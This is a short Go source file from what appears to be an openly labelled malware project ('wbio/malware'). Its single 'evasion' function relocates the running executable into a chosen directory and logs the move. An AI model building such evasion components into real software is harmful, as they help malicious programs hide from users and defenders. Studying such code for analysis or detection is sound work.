package evasion

import (
	"log"
	"os"
	"path/filepath"
	e "wbio/malware/errorinfo"
)

func MoveToTargetDirectory(targetDirectory string) {
	targetDirectory = filepath.FromSlash(targetDirectory)

	exec, err := os.Executable()
	e.Check(err, true)

	if filepath.Dir(exec) == targetDirectory {
		log.Printf("[EVASION] Program already in correct directory (%s)\n", targetDirectory)
		return
	}

	log.Printf("[EVASION] Creating target directory (%s)\n", targetDirectory)
	err = os.Mkdir(targetDirectory, 0755)
	e.Check(err, false)

	targetPath := filepath.FromSlash(targetDirectory + "/" + filepath.Base(exec))
	err = os.Rename(filepath.Clean(exec), targetPath)
	e.Check(err, true)
	log.Printf("[EVASION] Program moved from %s to %s\n", filepath.Clean(exec), targetPath)
}
